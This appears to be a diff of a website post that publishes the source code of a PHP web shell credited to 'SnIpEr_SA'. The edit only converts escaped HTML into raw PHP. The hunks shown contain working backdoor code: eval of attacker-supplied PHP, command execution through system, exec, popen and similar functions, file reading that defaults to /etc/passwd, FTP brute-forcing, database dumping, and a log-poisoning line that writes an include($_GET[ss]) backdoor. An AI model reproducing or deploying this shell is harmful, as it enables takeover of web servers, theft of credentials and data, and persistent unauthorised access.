@@ -15,7 +15,7 @@ tags:
 
 ### SnIpEr_SA Shell Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php
+{% highlight php %}<?php
 /******************************************************************************************************/
 /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
 /*  (c)oded by SnIpEr_SA
@@ -4111,8 +4111,8 @@ if ($_POST['cmd']=="ftp_brute")
  echo $lang[$language.'_text98'].$suc."\r\n";
  }
 if ($_POST['cmd']=="php_eval"){
- $eval = @str_replace("&lt;?","",$_POST['php_eval']);
- $eval = @str_replace("?&gt;","",$eval);
+ $eval = @str_replace("<?","",$_POST['php_eval']);
+ $eval = @str_replace("?>","",$eval);
  @eval($eval);}
 if ($_POST['cmd']=="mysql_dump")
  {
@@ -4160,20 +4160,20 @@ echo $te.'&lt;/div&gt;'.$table_end1.$fe;
 }
 echo $fs.$table_up1.div_title($lang[$language.'_text208'],'id15').$table_up2.div('id15').$ts;
 echo sr(15,"&lt;b&gt;".$lang[$language.'_text16'].$arrow."&lt;/b&gt;","&lt;select name=\"method\"&gt;
-                            &lt;option value=\"system\" &lt;? if ($method==\"system\") { echo \"selected\"; } ?&gt;system&lt;/option&gt;
-                            &lt;option value=\"passthru\" &lt;? if ($method==\"passthru\") { echo \"selected\"; } ?&gt;passthru&lt;/option&gt;
-                            &lt;option value=\"exec\" &lt;? if ($method==\"exec\") { echo \"selected\"; } ?&gt;exec&lt;/option&gt;
-                            &lt;option value=\"shell_exec\" &lt;? if ($method==\"shell_exec\") { echo \"selected\"; } ?&gt;shell_exec&lt;/option&gt;
-                            &lt;option value=\"popen\" &lt;? if ($method==\"popen\") { echo \"selected\"; } ?&gt;popen&lt;/option&gt;
-                            &lt;option value=\"proc_open\" &lt;? if ($method==\"proc_open\") { echo \"selected\"; } ?&gt;proc_open&lt;/option&gt;
+                            &lt;option value=\"system\" <? if ($method==\"system\") { echo \"selected\"; } ?>system&lt;/option&gt;
+                            &lt;option value=\"passthru\" <? if ($method==\"passthru\") { echo \"selected\"; } ?>passthru&lt;/option&gt;
+                            &lt;option value=\"exec\" <? if ($method==\"exec\") { echo \"selected\"; } ?>exec&lt;/option&gt;
+                            &lt;option value=\"shell_exec\" <? if ($method==\"shell_exec\") { echo \"selected\"; } ?>shell_exec&lt;/option&gt;
+                            &lt;option value=\"popen\" <? if ($method==\"popen\") { echo \"selected\"; } ?>popen&lt;/option&gt;
+                            &lt;option value=\"proc_open\" <? if ($method==\"proc_open\") { echo \"selected\"; } ?>proc_open&lt;/option&gt;
                       &lt;/select&gt;".in('hidden','dir',0,$dir).ws(2)."&lt;b&gt;".$lang[$language.'_text3'].$arrow."&lt;/b&gt;".in('text','command',54,(!empty($_POST['command'])?($_POST['command']):("id"))).in('hidden','cmd',0,'command').ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
 echo $te.'&lt;/div&gt;'.$table_end1.$fe;
 echo $fs.$table_up1.div_title($lang[$language.'_text223'],'id5').$table_up2.div('id5').$ts;
 echo sr(15,"&lt;b&gt;".$lang[$language.'_text16'].$arrow."&lt;/b&gt;","&lt;select name=\"method\"&gt;
-                            &lt;option value=\"file\" &lt;? if ($method==\"file\") { echo \"selected\"; } ?&gt; file&lt;/option&gt;
-                            &lt;option value=\"fread\" &lt;? if ($method==\"fread\") { echo \"selected\"; } ?&gt; fread&lt;/option&gt;
-                            &lt;option value=\"show_source\" &lt;? if ($method==\"show_source\") { echo \"selected\"; } ?&gt; show_source&lt;/option&gt;
-                            &lt;option value=\"readfile\" &lt;? if ($method==\"readfile\") { echo \"selected\"; } ?&gt; readfile&lt;/option&gt;
+                            &lt;option value=\"file\" <? if ($method==\"file\") { echo \"selected\"; } ?> file&lt;/option&gt;
+                            &lt;option value=\"fread\" <? if ($method==\"fread\") { echo \"selected\"; } ?> fread&lt;/option&gt;
+                            &lt;option value=\"show_source\" <? if ($method==\"show_source\") { echo \"selected\"; } ?> show_source&lt;/option&gt;
+                            &lt;option value=\"readfile\" <? if ($method==\"readfile\") { echo \"selected\"; } ?> readfile&lt;/option&gt;
                       &lt;/select&gt;".in('hidden','file',0,$dir).ws(2)."&lt;b&gt;".$lang[$language.'_text202'].$arrow."&lt;/b&gt;".in('text','file',41,'/etc/passwd').ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
 echo $te.'&lt;/div&gt;'.$table_end1.$fe;
 echo $fs.$table_up1.div_title($lang[$language.'_text42'],'id3').$table_up2.div('id3').$ts;
@@ -4453,8 +4453,8 @@ echo '&lt;/table&gt;'.$table_up3."&lt;/div&gt;&lt;/div&gt;&lt;div align=center i
 if(empty($_POST['log'])){
 } else {
 $log=$_POST['log'];
-echo  error_log("&lt;? print include(\$_GET[ss]) ?&gt;", 3,$log);
+echo  error_log("<? print include(\$_GET[ss]) ?>", 3,$log);
 echo "&lt;/textarea&gt;&lt;/CENTER&gt;";
 }
-?&gt;
-</pre>
+?>
+{% endhighlight %}
